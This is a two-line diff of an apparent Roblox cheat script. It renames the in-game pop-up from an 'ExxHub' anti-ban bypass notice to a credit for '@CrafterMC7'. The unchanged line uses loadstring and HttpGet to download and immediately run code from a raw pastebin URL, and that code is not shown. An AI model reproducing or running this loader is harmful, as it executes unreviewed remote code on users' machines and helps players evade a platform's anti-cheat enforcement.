@@ -1,2 +1,2 @@
-game.StarterGui:SetCore("SendNotification", {Title="ExxHub"; Text="BYPASS ANTI BAN ❌"; Duration=5;})
+game.StarterGui:SetCore("SendNotification", {Title="@CrafterMC7"; Text="Thank's using my scripts"; Duration=5;})
 loadstring(game:HttpGet("https://pastebin.com/raw/sH0Sd8qP"))()
